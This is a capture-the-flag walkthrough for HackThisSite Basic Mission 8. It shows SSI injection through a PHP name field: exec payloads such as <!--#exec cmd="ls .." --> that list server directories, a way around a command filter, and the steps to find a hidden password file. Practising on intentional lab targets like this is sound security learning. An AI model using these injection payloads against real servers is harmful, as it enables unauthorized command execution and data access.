The password is yet again hidden in an unknown file. Sam's daughter has begun learning PHP
, and has a small script to demonstrate her knowledge.
Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)

So this challenge Code :
```html
<td class="sitebuffer" valign="top">
	<br>
		<br><center>
<br><center><b>Level 8</b></center><br><br>Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/<br><br>However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. She recently learned about saving files, and she wrote a script to demonstrate her ability.<br><br><center>Enter your name:
						 <form action="/missions/basic/8/level8.php" method="post">
						 <input name="name" type="text"><input value="submit" type="submit"></form>
						 </center><br><br><center><b>Password:</b><br>
						 <form action="/missions/basic/8/index.php" method="post">
						 <input name="password" type="password"><br><br>
						 <input value="submit" type="submit"></form>
</center></center></td>
```
and the challenge hint was to use SSI this is OWASP Document https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection

so when we inject the following command 
```html
<!--#exec cmd="ls" -->
``` 
the result was the following 
```text
Hi, tshngmww.shtml hipykpqu.shtml ztxdhjxn.shtml avpfeoie.shtml fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml whqxxojt.shtml ylomcmvu.shtml uhdppswp.shtml gzntiicx.shtml dzwbqiuu.shtml qvzuieng.shtml smcerykh.shtml qjhnmhmq.shtml znodwztr.shtml!

Your name contains 254 characters.
```
now its mentioned that the flag is in this directory **/var/www/hackthissite.org/html/missions/basic/8/**

so we need to modify the command to list this path 
```html
<!--#exec cmd="ls  /var/www/hackthissite.org/html/missions/basic/8/" -->
```
and we went right into a filter 

```text
If you are trying to use server side includes to solve the challenge,
you are on the right track: but I have limited the commands allowed to ones relevant towards finding the password file for security reasons(because there will always be that one person who decides to execute some rather nasty commands).
So please manipulate your code so that it is a little more pertaining to the level.
```
 Since we can't list the Parent Directory using the full path we can list it using the below command 
 ```html
 <!--#exec cmd="ls .." -->
 ```
 and the output is the following 
 
 ```text
 Hi, au12ha39vc.php index.php level8.php tmp!

Your name contains 39 characters.
```
so lets call this file in Browser and we get our Password
